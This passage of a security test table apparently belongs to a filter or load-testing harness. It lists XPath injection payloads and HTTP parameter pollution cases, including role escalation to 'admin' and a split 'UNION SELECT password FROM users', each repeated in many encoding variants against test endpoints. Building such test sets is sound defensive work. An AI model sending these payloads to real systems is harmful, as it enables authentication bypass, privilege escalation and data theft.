| ` xpath/variant-03863 ` | ` xpath/syntax-0265 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/xpath ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0027\u0009\u006f\u0072\u0009\u0074\u0072\u0075\u0065\u0028\u0029\u0009\u006f\u0072\u0009\u0027\u0061\u0027\u003d\u0027\u0062"} ` | 97 |
| ` xpath/variant-03864 ` | ` xpath/syntax-0265 ` | ` json-layout-20 ` | POST | ` /api/loadtest/xpath ` | ` {\n "input": "'\tor\ttrue()\tor\t'a'='b"\n} ` | 97 |
| ` xpath/variant-03865 ` | ` xpath/syntax-0265 ` | ` json-layout-09 ` | POST | ` /api/loadtest/xpath ` | ` {\n\t"input": "'\tor\ttrue()\tor\t'a'='b"\n} ` | 97 |
| ` xpath/variant-03866 ` | ` xpath/syntax-0266 ` | ` query-encoded-name ` | GET | ` /api/loadtest/xpath?%69%6E%70%75%74=%27+or+%28true%28%29%29+or+%27a%27%3D%27b ` | (empty) | 97 |
| ` xpath/variant-03867 ` | ` xpath/syntax-0266 ` | ` query-encoded-value ` | GET | ` /api/loadtest/xpath?input=%27%20%6F%72%20%28%74%72%75%65%28%29%29%20%6F%72%20%27%61%27%3D%27%62 ` | (empty) | 97 |
| ` xpath/variant-03868 ` | ` xpath/syntax-0266 ` | ` query-encoded-both ` | GET | ` /api/loadtest/xpath?%69%6E%70%75%74=%27%20%6F%72%20%28%74%72%75%65%28%29%29%20%6F%72%20%27%61%27%3D%27%62 ` | (empty) | 97 |
| ` xpath/variant-03869 ` | ` xpath/syntax-0266 ` | ` query-lower-hex ` | GET | ` /api/loadtest/xpath?%69%6e%70%75%74=%27%20%6f%72%20%28%74%72%75%65%28%29%29%20%6f%72%20%27%61%27%3d%27%62 ` | (empty) | 97 |
| ` xpath/variant-03870 ` | ` xpath/syntax-0266 ` | ` query-percent-space ` | GET | ` /api/loadtest/xpath?input=%27%20or%20%28true%28%29%29%20or%20%27a%27%3D%27b ` | (empty) | 97 |
| ` xpath/variant-03871 ` | ` xpath/syntax-0267 ` | ` form-encoded-name ` | POST | ` /api/loadtest/xpath ` | ` %69%6E%70%75%74=%27+or+%28true%28%29%29+or+%27a%27%3D%27b ` | 97 |
| ` xpath/variant-03872 ` | ` xpath/syntax-0267 ` | ` form-encoded-value ` | POST | ` /api/loadtest/xpath ` | ` input=%27%20%6F%72%20%28%74%72%75%65%28%29%29%20%6F%72%20%27%61%27%3D%27%62 ` | 97 |
| ` xpath/variant-03873 ` | ` xpath/syntax-0267 ` | ` form-encoded-both ` | POST | ` /api/loadtest/xpath ` | ` %69%6E%70%75%74=%27%20%6F%72%20%28%74%72%75%65%28%29%29%20%6F%72%20%27%61%27%3D%27%62 ` | 97 |
| ` xpath/variant-03874 ` | ` xpath/syntax-0267 ` | ` form-lower-hex ` | POST | ` /api/loadtest/xpath ` | ` %69%6e%70%75%74=%27%20%6f%72%20%28%74%72%75%65%28%29%29%20%6f%72%20%27%61%27%3d%27%62 ` | 97 |
| ` xpath/variant-03875 ` | ` xpath/syntax-0267 ` | ` form-percent-space ` | POST | ` /api/loadtest/xpath ` | ` input=%27%20or%20%28true%28%29%29%20or%20%27a%27%3D%27b ` | 97 |
| ` xpath/variant-03876 ` | ` xpath/syntax-0268 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/xpath ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0027\u0020\u006f\u0072\u0020\u0028\u0074\u0072\u0075\u0065\u0028\u0029\u0029\u0020\u006f\u0072\u0020\u0027\u0061\u0027\u003d\u0027\u0062"} ` | 97 |
| ` xpath/variant-03877 ` | ` xpath/syntax-0268 ` | ` json-layout-20 ` | POST | ` /api/loadtest/xpath ` | ` {\n "input": "' or (true()) or 'a'='b"\n} ` | 97 |
| ` xpath/variant-03878 ` | ` xpath/syntax-0268 ` | ` json-layout-09 ` | POST | ` /api/loadtest/xpath ` | ` {\n\t"input": "' or (true()) or 'a'='b"\n} ` | 97 |
| ` xpath/variant-03879 ` | ` xpath/syntax-0269 ` | ` query-encoded-name ` | GET | ` /api/loadtest/xpath?%69%6E%70%75%74=%27+or+count%28%2F%2Fuser%29%3E%3D1+or+%27a%27%3D%27b ` | (empty) | 97 |
| ` xpath/variant-03880 ` | ` xpath/syntax-0269 ` | ` query-encoded-value ` | GET | ` /api/loadtest/xpath?input=%27%20%6F%72%20%63%6F%75%6E%74%28%2F%2F%75%73%65%72%29%3E%3D%31%20%6F%72%20%27%61%27%3D%27%62 ` | (empty) | 97 |
| ` xpath/variant-03881 ` | ` xpath/syntax-0269 ` | ` query-encoded-both ` | GET | ` /api/loadtest/xpath?%69%6E%70%75%74=%27%20%6F%72%20%63%6F%75%6E%74%28%2F%2F%75%73%65%72%29%3E%3D%31%20%6F%72%20%27%61%27%3D%27%62 ` | (empty) | 97 |
| ` xpath/variant-03882 ` | ` xpath/syntax-0269 ` | ` query-lower-hex ` | GET | ` /api/loadtest/xpath?%69%6e%70%75%74=%27%20%6f%72%20%63%6f%75%6e%74%28%2f%2f%75%73%65%72%29%3e%3d%31%20%6f%72%20%27%61%27%3d%27%62 ` | (empty) | 97 |
| ` xpath/variant-03883 ` | ` xpath/syntax-0269 ` | ` query-percent-space ` | GET | ` /api/loadtest/xpath?input=%27%20or%20count%28%2F%2Fuser%29%3E%3D1%20or%20%27a%27%3D%27b ` | (empty) | 97 |
| ` xpath/variant-03884 ` | ` xpath/syntax-0270 ` | ` form-encoded-name ` | POST | ` /api/loadtest/xpath ` | ` %69%6E%70%75%74=%27+or+count%28%2F%2Fuser%29%3E%3D1+or+%27a%27%3D%27b ` | 97 |
| ` xpath/variant-03885 ` | ` xpath/syntax-0270 ` | ` form-encoded-value ` | POST | ` /api/loadtest/xpath ` | ` input=%27%20%6F%72%20%63%6F%75%6E%74%28%2F%2F%75%73%65%72%29%3E%3D%31%20%6F%72%20%27%61%27%3D%27%62 ` | 97 |
| ` xpath/variant-03886 ` | ` xpath/syntax-0270 ` | ` form-encoded-both ` | POST | ` /api/loadtest/xpath ` | ` %69%6E%70%75%74=%27%20%6F%72%20%63%6F%75%6E%74%28%2F%2F%75%73%65%72%29%3E%3D%31%20%6F%72%20%27%61%27%3D%27%62 ` | 97 |
| ` xpath/variant-03887 ` | ` xpath/syntax-0270 ` | ` form-lower-hex ` | POST | ` /api/loadtest/xpath ` | ` %69%6e%70%75%74=%27%20%6f%72%20%63%6f%75%6e%74%28%2f%2f%75%73%65%72%29%3e%3d%31%20%6f%72%20%27%61%27%3d%27%62 ` | 97 |
| ` xpath/variant-03888 ` | ` xpath/syntax-0270 ` | ` form-percent-space ` | POST | ` /api/loadtest/xpath ` | ` input=%27%20or%20count%28%2F%2Fuser%29%3E%3D1%20or%20%27a%27%3D%27b ` | 97 |
| ` xpath/variant-03889 ` | ` xpath/syntax-0271 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/xpath ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0027\u0020\u006f\u0072\u0020\u0063\u006f\u0075\u006e\u0074\u0028\u002f\u002f\u0075\u0073\u0065\u0072\u0029\u003e\u003d\u0031\u0020\u006f\u0072\u0020\u0027\u0061\u0027\u003d\u0027\u0062"} ` | 97 |
| ` xpath/variant-03890 ` | ` xpath/syntax-0271 ` | ` json-layout-20 ` | POST | ` /api/loadtest/xpath ` | ` {\n "input": "' or count(//user)\u003e=1 or 'a'='b"\n} ` | 97 |
| ` xpath/variant-03891 ` | ` xpath/syntax-0271 ` | ` json-layout-09 ` | POST | ` /api/loadtest/xpath ` | ` {\n\t"input": "' or count(//user)\u003e=1 or 'a'='b"\n} ` | 97 |
| ` xpath/variant-03892 ` | ` xpath/syntax-0272 ` | ` query-encoded-name ` | GET | ` /api/loadtest/xpath?%69%6E%70%75%74=%27+or+contains%28name%28%29%2C+%27user%27%29+or+%27a%27%3D%27b ` | (empty) | 97 |
| ` xpath/variant-03893 ` | ` xpath/syntax-0272 ` | ` query-encoded-value ` | GET | ` /api/loadtest/xpath?input=%27%20%6F%72%20%63%6F%6E%74%61%69%6E%73%28%6E%61%6D%65%28%29%2C%20%27%75%73%65%72%27%29%20%6F%72%20%27%61%27%3D%27%62 ` | (empty) | 97 |
| ` xpath/variant-03894 ` | ` xpath/syntax-0272 ` | ` query-encoded-both ` | GET | ` /api/loadtest/xpath?%69%6E%70%75%74=%27%20%6F%72%20%63%6F%6E%74%61%69%6E%73%28%6E%61%6D%65%28%29%2C%20%27%75%73%65%72%27%29%20%6F%72%20%27%61%27%3D%27%62 ` | (empty) | 97 |
| ` xpath/variant-03895 ` | ` xpath/syntax-0272 ` | ` query-lower-hex ` | GET | ` /api/loadtest/xpath?%69%6e%70%75%74=%27%20%6f%72%20%63%6f%6e%74%61%69%6e%73%28%6e%61%6d%65%28%29%2c%20%27%75%73%65%72%27%29%20%6f%72%20%27%61%27%3d%27%62 ` | (empty) | 97 |
| ` xpath/variant-03896 ` | ` xpath/syntax-0272 ` | ` query-percent-space ` | GET | ` /api/loadtest/xpath?input=%27%20or%20contains%28name%28%29%2C%20%27user%27%29%20or%20%27a%27%3D%27b ` | (empty) | 97 |
| ` xpath/variant-03897 ` | ` xpath/syntax-0273 ` | ` form-encoded-name ` | POST | ` /api/loadtest/xpath ` | ` %69%6E%70%75%74=%27+or+contains%28name%28%29%2C+%27user%27%29+or+%27a%27%3D%27b ` | 97 |
| ` xpath/variant-03898 ` | ` xpath/syntax-0273 ` | ` form-encoded-value ` | POST | ` /api/loadtest/xpath ` | ` input=%27%20%6F%72%20%63%6F%6E%74%61%69%6E%73%28%6E%61%6D%65%28%29%2C%20%27%75%73%65%72%27%29%20%6F%72%20%27%61%27%3D%27%62 ` | 97 |
| ` xpath/variant-03899 ` | ` xpath/syntax-0273 ` | ` form-encoded-both ` | POST | ` /api/loadtest/xpath ` | ` %69%6E%70%75%74=%27%20%6F%72%20%63%6F%6E%74%61%69%6E%73%28%6E%61%6D%65%28%29%2C%20%27%75%73%65%72%27%29%20%6F%72%20%27%61%27%3D%27%62 ` | 97 |
| ` xpath/variant-03900 ` | ` xpath/syntax-0273 ` | ` form-lower-hex ` | POST | ` /api/loadtest/xpath ` | ` %69%6e%70%75%74=%27%20%6f%72%20%63%6f%6e%74%61%69%6e%73%28%6e%61%6d%65%28%29%2c%20%27%75%73%65%72%27%29%20%6f%72%20%27%61%27%3d%27%62 ` | 97 |
| ` xpath/variant-03901 ` | ` xpath/syntax-0273 ` | ` form-percent-space ` | POST | ` /api/loadtest/xpath ` | ` input=%27%20or%20contains%28name%28%29%2C%20%27user%27%29%20or%20%27a%27%3D%27b ` | 97 |
| ` xpath/variant-03902 ` | ` xpath/syntax-0274 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/xpath ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0027\u0020\u006f\u0072\u0020\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u006e\u0061\u006d\u0065\u0028\u0029\u002c\u0020\u0027\u0075\u0073\u0065\u0072\u0027\u0029\u0020\u006f\u0072\u0020\u0027\u0061\u0027\u003d\u0027\u0062"} ` | 97 |
| ` xpath/variant-03903 ` | ` xpath/syntax-0274 ` | ` json-layout-20 ` | POST | ` /api/loadtest/xpath ` | ` {\n "input": "' or contains(name(), 'user') or 'a'='b"\n} ` | 97 |
| ` xpath/variant-03904 ` | ` xpath/syntax-0274 ` | ` json-layout-09 ` | POST | ` /api/loadtest/xpath ` | ` {\n\t"input": "' or contains(name(), 'user') or 'a'='b"\n} ` | 97 |
| ` xpath/variant-03905 ` | ` xpath/syntax-0275 ` | ` query-encoded-name ` | GET | ` /api/loadtest/xpath?%69%6E%70%75%74=%27+or+not%28false%28%29%29+or+%27a%27%3D%27b ` | (empty) | 97 |
| ` xpath/variant-03906 ` | ` xpath/syntax-0275 ` | ` query-encoded-value ` | GET | ` /api/loadtest/xpath?input=%27%20%6F%72%20%6E%6F%74%28%66%61%6C%73%65%28%29%29%20%6F%72%20%27%61%27%3D%27%62 ` | (empty) | 97 |
| ` xpath/variant-03907 ` | ` xpath/syntax-0275 ` | ` query-encoded-both ` | GET | ` /api/loadtest/xpath?%69%6E%70%75%74=%27%20%6F%72%20%6E%6F%74%28%66%61%6C%73%65%28%29%29%20%6F%72%20%27%61%27%3D%27%62 ` | (empty) | 97 |
| ` xpath/variant-03908 ` | ` xpath/syntax-0275 ` | ` query-lower-hex ` | GET | ` /api/loadtest/xpath?%69%6e%70%75%74=%27%20%6f%72%20%6e%6f%74%28%66%61%6c%73%65%28%29%29%20%6f%72%20%27%61%27%3d%27%62 ` | (empty) | 97 |
| ` xpath/variant-03909 ` | ` xpath/syntax-0275 ` | ` query-percent-space ` | GET | ` /api/loadtest/xpath?input=%27%20or%20not%28false%28%29%29%20or%20%27a%27%3D%27b ` | (empty) | 97 |
| ` xpath/variant-03910 ` | ` xpath/syntax-0276 ` | ` form-encoded-name ` | POST | ` /api/loadtest/xpath ` | ` %69%6E%70%75%74=%27+or+not%28false%28%29%29+or+%27a%27%3D%27b ` | 97 |
| ` xpath/variant-03911 ` | ` xpath/syntax-0276 ` | ` form-encoded-value ` | POST | ` /api/loadtest/xpath ` | ` input=%27%20%6F%72%20%6E%6F%74%28%66%61%6C%73%65%28%29%29%20%6F%72%20%27%61%27%3D%27%62 ` | 97 |
| ` xpath/variant-03912 ` | ` xpath/syntax-0276 ` | ` form-encoded-both ` | POST | ` /api/loadtest/xpath ` | ` %69%6E%70%75%74=%27%20%6F%72%20%6E%6F%74%28%66%61%6C%73%65%28%29%29%20%6F%72%20%27%61%27%3D%27%62 ` | 97 |
| ` xpath/variant-03913 ` | ` xpath/syntax-0276 ` | ` form-lower-hex ` | POST | ` /api/loadtest/xpath ` | ` %69%6e%70%75%74=%27%20%6f%72%20%6e%6f%74%28%66%61%6c%73%65%28%29%29%20%6f%72%20%27%61%27%3d%27%62 ` | 97 |
| ` xpath/variant-03914 ` | ` xpath/syntax-0276 ` | ` form-percent-space ` | POST | ` /api/loadtest/xpath ` | ` input=%27%20or%20not%28false%28%29%29%20or%20%27a%27%3D%27b ` | 97 |
| ` xpath/variant-03915 ` | ` xpath/syntax-0277 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/xpath ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0027\u0020\u006f\u0072\u0020\u006e\u006f\u0074\u0028\u0066\u0061\u006c\u0073\u0065\u0028\u0029\u0029\u0020\u006f\u0072\u0020\u0027\u0061\u0027\u003d\u0027\u0062"} ` | 97 |
| ` xpath/variant-03916 ` | ` xpath/syntax-0277 ` | ` json-layout-20 ` | POST | ` /api/loadtest/xpath ` | ` {\n "input": "' or not(false()) or 'a'='b"\n} ` | 97 |
| ` xpath/variant-03917 ` | ` xpath/syntax-0277 ` | ` json-layout-09 ` | POST | ` /api/loadtest/xpath ` | ` {\n\t"input": "' or not(false()) or 'a'='b"\n} ` | 97 |
| ` xpath/variant-03918 ` | ` xpath/syntax-0278 ` | ` query-encoded-name ` | GET | ` /api/loadtest/xpath?%69%6E%70%75%74=%27%5D%7C%2F%2Fuser%7C%2F%2F%2A%5B%27a%27%3D%27a ` | (empty) | 97 |
| ` xpath/variant-03919 ` | ` xpath/syntax-0278 ` | ` query-encoded-value ` | GET | ` /api/loadtest/xpath?input=%27%5D%7C%2F%2F%75%73%65%72%7C%2F%2F%2A%5B%27%61%27%3D%27%61 ` | (empty) | 97 |
| ` xpath/variant-03920 ` | ` xpath/syntax-0278 ` | ` query-encoded-both ` | GET | ` /api/loadtest/xpath?%69%6E%70%75%74=%27%5D%7C%2F%2F%75%73%65%72%7C%2F%2F%2A%5B%27%61%27%3D%27%61 ` | (empty) | 97 |
| ` xpath/variant-03921 ` | ` xpath/syntax-0278 ` | ` query-lower-hex ` | GET | ` /api/loadtest/xpath?%69%6e%70%75%74=%27%5d%7c%2f%2f%75%73%65%72%7c%2f%2f%2a%5b%27%61%27%3d%27%61 ` | (empty) | 97 |
| ` xpath/variant-03922 ` | ` xpath/syntax-0279 ` | ` form-encoded-name ` | POST | ` /api/loadtest/xpath ` | ` %69%6E%70%75%74=%27%5D%7C%2F%2Fuser%7C%2F%2F%2A%5B%27a%27%3D%27a ` | 97 |
| ` xpath/variant-03923 ` | ` xpath/syntax-0279 ` | ` form-encoded-value ` | POST | ` /api/loadtest/xpath ` | ` input=%27%5D%7C%2F%2F%75%73%65%72%7C%2F%2F%2A%5B%27%61%27%3D%27%61 ` | 97 |
| ` xpath/variant-03924 ` | ` xpath/syntax-0279 ` | ` form-encoded-both ` | POST | ` /api/loadtest/xpath ` | ` %69%6E%70%75%74=%27%5D%7C%2F%2F%75%73%65%72%7C%2F%2F%2A%5B%27%61%27%3D%27%61 ` | 97 |
| ` xpath/variant-03925 ` | ` xpath/syntax-0279 ` | ` form-lower-hex ` | POST | ` /api/loadtest/xpath ` | ` %69%6e%70%75%74=%27%5d%7c%2f%2f%75%73%65%72%7c%2f%2f%2a%5b%27%61%27%3d%27%61 ` | 97 |
| ` xpath/variant-03926 ` | ` xpath/syntax-0280 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/xpath ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0027\u005d\u007c\u002f\u002f\u0075\u0073\u0065\u0072\u007c\u002f\u002f\u002a\u005b\u0027\u0061\u0027\u003d\u0027\u0061"} ` | 97 |
| ` xpath/variant-03927 ` | ` xpath/syntax-0280 ` | ` json-layout-20 ` | POST | ` /api/loadtest/xpath ` | ` {\n "input": "']\|//user\|//*['a'='a"\n} ` | 97 |
| ` xpath/variant-03928 ` | ` xpath/syntax-0280 ` | ` json-layout-09 ` | POST | ` /api/loadtest/xpath ` | ` {\n\t"input": "']\|//user\|//*['a'='a"\n} ` | 97 |

## HTTP parameter pollution

| Case | Parent | Variation | Method | Wire target | Body or relevant header | Origin requests |
| --- | --- | --- | --- | --- | --- | ---: |
| ` hpp/syntax-0317 ` | ` hpp/syntax-family ` | ` syntax-scalar-array-clash ` | POST | ` /api/update ` | ` role[0]=user&role=admin ` | 98 |
| ` hpp/syntax-0327 ` | ` hpp/syntax-family ` | ` syntax-scalar-array-clash ` | POST | ` /api/update ` | ` role[1]=user&role=admin ` | 98 |
| ` hpp/syntax-0337 ` | ` hpp/syntax-family ` | ` syntax-scalar-array-clash ` | POST | ` /api/update ` | ` role[2]=user&role=admin ` | 98 |
| ` hpp/syntax-0347 ` | ` hpp/syntax-family ` | ` syntax-scalar-array-clash ` | POST | ` /api/update ` | ` role[3]=user&role=admin ` | 98 |
| ` hpp/syntax-0357 ` | ` hpp/syntax-family ` | ` syntax-scalar-array-clash ` | POST | ` /api/update ` | ` role[4]=user&role=admin ` | 98 |
| ` hpp/syntax-0367 ` | ` hpp/syntax-family ` | ` syntax-scalar-array-clash ` | POST | ` /api/update ` | ` role[5]=user&role=admin ` | 98 |
| ` hpp/syntax-0377 ` | ` hpp/syntax-family ` | ` syntax-scalar-array-clash ` | POST | ` /api/update ` | ` role[6]=user&role=admin ` | 98 |
| ` hpp/syntax-0387 ` | ` hpp/syntax-family ` | ` syntax-scalar-array-clash ` | POST | ` /api/update ` | ` role[7]=user&role=admin ` | 98 |
| ` hpp/v01-form ` | (original) | (original) | POST | ` /api/update ` | ` role=user&role=admin ` | 98 |
| ` hpp/v01-query ` | (original) | (original) | GET | ` /api/update?role=user&role=admin ` | (empty) | 98 |
| ` hpp/v02-form ` | (original) | (original) | POST | ` /api/update ` | ` role=user&%72ole=admin ` | 98 |
| ` hpp/v02-query ` | (original) | (original) | GET | ` /api/update?role=user&%72ole=admin ` | (empty) | 98 |
| ` hpp/v03-form ` | (original) | (original) | POST | ` /api/update ` | ` role=user&role[]=admin ` | 98 |
| ` hpp/v03-query ` | (original) | (original) | GET | ` /api/update?role=user&role[]=admin ` | (empty) | 98 |
| ` hpp/v04-form ` | (original) | (original) | POST | ` /api/update ` | ` role[]=user&role=admin ` | 98 |
| ` hpp/v04-query ` | (original) | (original) | GET | ` /api/update?role[]=user&role=admin ` | (empty) | 98 |
| ` hpp/v05-form ` | (original) | (original) | POST | ` /api/update ` | ` user.name=alice&user_name=admin ` | 98 |
| ` hpp/v05-query ` | (original) | (original) | GET | ` /api/update?user.name=alice&user_name=admin ` | (empty) | 98 |
| ` hpp/v06-form ` | (original) | (original) | POST | ` /api/update ` | ` user+name=alice&user_name=admin ` | 98 |
| ` hpp/v06-query ` | (original) | (original) | GET | ` /api/update?user+name=alice&user_name=admin ` | (empty) | 98 |
| ` hpp/v08-form ` | (original) | (original) | POST | ` /api/update ` | ` q=UNION&q=SELECT+password+FROM+users ` | 98 |
| ` hpp/v08-query ` | (original) | (original) | GET | ` /api/update?q=UNION&q=SELECT+password+FROM+users ` | (empty) | 98 |
| ` hpp/v11-form ` | (original) | (original) | POST | ` /api/update ` | ` enabled=false&enabled=true ` | 98 |
| ` hpp/v11-query ` | (original) | (original) | GET | ` /api/update?enabled=false&enabled=true ` | (empty) | 98 |
| ` hpp/v12-form ` | (original) | (original) | POST | ` /api/update ` | ` ids[0]=1&ids[0]=2 ` | 98 |
| ` hpp/v12-query ` | (original) | (original) | GET | ` /api/update?ids[0]=1&ids[0]=2 ` | (empty) | 98 |
| ` hpp/variant-02574 ` | ` hpp/v01-query ` | ` query-encoded-name ` | GET | ` /api/update?%72%6F%6C%65=user&%72%6F%6C%65=admin ` | (empty) | 97 |
| ` hpp/variant-02575 ` | ` hpp/v01-query ` | ` query-encoded-value ` | GET | ` /api/update?role=%75%73%65%72&role=%61%64%6D%69%6E ` | (empty) | 97 |
| ` hpp/variant-02576 ` | ` hpp/v01-query ` | ` query-encoded-both ` | GET | ` /api/update?%72%6F%6C%65=%75%73%65%72&%72%6F%6C%65=%61%64%6D%69%6E ` | (empty) | 97 |
| ` hpp/variant-02577 ` | ` hpp/v01-query ` | ` query-lower-hex ` | GET | ` /api/update?%72%6f%6c%65=%75%73%65%72&%72%6f%6c%65=%61%64%6d%69%6e ` | (empty) | 97 |
| ` hpp/variant-02578 ` | ` hpp/v01-form ` | ` form-encoded-name ` | POST | ` /api/update ` | ` %72%6F%6C%65=user&%72%6F%6C%65=admin ` | 97 |
| ` hpp/variant-02579 ` | ` hpp/v01-form ` | ` form-encoded-value ` | POST | ` /api/update ` | ` role=%75%73%65%72&role=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-02580 ` | ` hpp/v01-form ` | ` form-encoded-both ` | POST | ` /api/update ` | ` %72%6F%6C%65=%75%73%65%72&%72%6F%6C%65=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-02581 ` | ` hpp/v01-form ` | ` form-lower-hex ` | POST | ` /api/update ` | ` %72%6f%6c%65=%75%73%65%72&%72%6f%6c%65=%61%64%6d%69%6e ` | 97 |
| ` hpp/variant-02582 ` | ` hpp/v02-query ` | ` query-encoded-value ` | GET | ` /api/update?role=%75%73%65%72&%72ole=%61%64%6D%69%6E ` | (empty) | 97 |
| ` hpp/variant-02583 ` | ` hpp/v02-form ` | ` form-encoded-value ` | POST | ` /api/update ` | ` role=%75%73%65%72&%72ole=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-02584 ` | ` hpp/v03-query ` | ` query-encoded-name ` | GET | ` /api/update?%72%6F%6C%65=user&%72%6F%6C%65%5B%5D=admin ` | (empty) | 97 |
| ` hpp/variant-02585 ` | ` hpp/v03-query ` | ` query-encoded-value ` | GET | ` /api/update?role=%75%73%65%72&role[]=%61%64%6D%69%6E ` | (empty) | 97 |
| ` hpp/variant-02586 ` | ` hpp/v03-query ` | ` query-encoded-both ` | GET | ` /api/update?%72%6F%6C%65=%75%73%65%72&%72%6F%6C%65%5B%5D=%61%64%6D%69%6E ` | (empty) | 97 |
| ` hpp/variant-02587 ` | ` hpp/v03-query ` | ` query-lower-hex ` | GET | ` /api/update?%72%6f%6c%65=%75%73%65%72&%72%6f%6c%65%5b%5d=%61%64%6d%69%6e ` | (empty) | 97 |
| ` hpp/variant-02588 ` | ` hpp/v03-query ` | ` query-percent-space ` | GET | ` /api/update?role=user&role%5B%5D=admin ` | (empty) | 97 |
| ` hpp/variant-02589 ` | ` hpp/v03-form ` | ` form-encoded-name ` | POST | ` /api/update ` | ` %72%6F%6C%65=user&%72%6F%6C%65%5B%5D=admin ` | 97 |
| ` hpp/variant-02590 ` | ` hpp/v03-form ` | ` form-encoded-value ` | POST | ` /api/update ` | ` role=%75%73%65%72&role[]=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-02591 ` | ` hpp/v03-form ` | ` form-encoded-both ` | POST | ` /api/update ` | ` %72%6F%6C%65=%75%73%65%72&%72%6F%6C%65%5B%5D=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-02592 ` | ` hpp/v03-form ` | ` form-lower-hex ` | POST | ` /api/update ` | ` %72%6f%6c%65=%75%73%65%72&%72%6f%6c%65%5b%5d=%61%64%6d%69%6e ` | 97 |
| ` hpp/variant-02593 ` | ` hpp/v03-form ` | ` form-percent-space ` | POST | ` /api/update ` | ` role=user&role%5B%5D=admin ` | 97 |
| ` hpp/variant-02594 ` | ` hpp/v04-query ` | ` query-encoded-name ` | GET | ` /api/update?%72%6F%6C%65%5B%5D=user&%72%6F%6C%65=admin ` | (empty) | 97 |
| ` hpp/variant-02595 ` | ` hpp/v04-query ` | ` query-encoded-value ` | GET | ` /api/update?role[]=%75%73%65%72&role=%61%64%6D%69%6E ` | (empty) | 97 |
| ` hpp/variant-02596 ` | ` hpp/v04-query ` | ` query-encoded-both ` | GET | ` /api/update?%72%6F%6C%65%5B%5D=%75%73%65%72&%72%6F%6C%65=%61%64%6D%69%6E ` | (empty) | 97 |
| ` hpp/variant-02597 ` | ` hpp/v04-query ` | ` query-lower-hex ` | GET | ` /api/update?%72%6f%6c%65%5b%5d=%75%73%65%72&%72%6f%6c%65=%61%64%6d%69%6e ` | (empty) | 97 |
| ` hpp/variant-02598 ` | ` hpp/v04-query ` | ` query-percent-space ` | GET | ` /api/update?role%5B%5D=user&role=admin ` | (empty) | 97 |
| ` hpp/variant-02599 ` | ` hpp/v04-form ` | ` form-encoded-name ` | POST | ` /api/update ` | ` %72%6F%6C%65%5B%5D=user&%72%6F%6C%65=admin ` | 97 |
| ` hpp/variant-02600 ` | ` hpp/v04-form ` | ` form-encoded-value ` | POST | ` /api/update ` | ` role[]=%75%73%65%72&role=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-02601 ` | ` hpp/v04-form ` | ` form-encoded-both ` | POST | ` /api/update ` | ` %72%6F%6C%65%5B%5D=%75%73%65%72&%72%6F%6C%65=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-02602 ` | ` hpp/v04-form ` | ` form-lower-hex ` | POST | ` /api/update ` | ` %72%6f%6c%65%5b%5d=%75%73%65%72&%72%6f%6c%65=%61%64%6d%69%6e ` | 97 |
| ` hpp/variant-02603 ` | ` hpp/v04-form ` | ` form-percent-space ` | POST | ` /api/update ` | ` role%5B%5D=user&role=admin ` | 97 |
| ` hpp/variant-02604 ` | ` hpp/v05-query ` | ` query-encoded-name ` | GET | ` /api/update?%75%73%65%72%2E%6E%61%6D%65=alice&%75%73%65%72%5F%6E%61%6D%65=admin ` | (empty) | 97 |
| ` hpp/variant-02605 ` | ` hpp/v05-query ` | ` query-encoded-value ` | GET | ` /api/update?user.name=%61%6C%69%63%65&user_name=%61%64%6D%69%6E ` | (empty) | 97 |
| ` hpp/variant-02606 ` | ` hpp/v05-query ` | ` query-encoded-both ` | GET | ` /api/update?%75%73%65%72%2E%6E%61%6D%65=%61%6C%69%63%65&%75%73%65%72%5F%6E%61%6D%65=%61%64%6D%69%6E ` | (empty) | 97 |
| ` hpp/variant-02607 ` | ` hpp/v05-query ` | ` query-lower-hex ` | GET | ` /api/update?%75%73%65%72%2e%6e%61%6d%65=%61%6c%69%63%65&%75%73%65%72%5f%6e%61%6d%65=%61%64%6d%69%6e ` | (empty) | 97 |
| ` hpp/variant-02608 ` | ` hpp/v05-form ` | ` form-encoded-name ` | POST | ` /api/update ` | ` %75%73%65%72%2E%6E%61%6D%65=alice&%75%73%65%72%5F%6E%61%6D%65=admin ` | 97 |
| ` hpp/variant-02609 ` | ` hpp/v05-form ` | ` form-encoded-value ` | POST | ` /api/update ` | ` user.name=%61%6C%69%63%65&user_name=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-02610 ` | ` hpp/v05-form ` | ` form-encoded-both ` | POST | ` /api/update ` | ` %75%73%65%72%2E%6E%61%6D%65=%61%6C%69%63%65&%75%73%65%72%5F%6E%61%6D%65=%61%64%6D%69%6E ` | 97 |
| ` hpp/variant-02611 ` | ` hpp/v05-form ` | ` form-lower-hex ` | POST | ` /api/update ` | ` %75%73%65%72%2e%6e%61%6d%65=%61%6c%69%63%65&%75%73%65%72%5f%6e%61%6d%65=%61%64%6d%69%6e ` | 97 |
| ` hpp/variant-02612 ` | ` hpp/v06-query ` | ` query-encoded-name ` | GET | ` /api/update?%75%73%65%72%20%6E%61%6D%65=alice&%75%73%65%72%5F%6E%61%6D%65=admin ` | (empty) | 97 |
| ` hpp/variant-02613 ` | ` hpp/v06-query ` | ` query-encoded-value ` | GET | ` /api/update?user+name=%61%6C%69%63%65&user_name=%61%64%6D%69%6E ` | (empty) | 97 |
| ` hpp/variant-02614 ` | ` hpp/v06-query ` | ` query-encoded-both ` | GET | ` /api/update?%75%73%65%72%20%6E%61%6D%65=%61%6C%69%63%65&%75%73%65%72%5F%6E%61%6D%65=%61%64%6D%69%6E ` | (empty) | 97 |
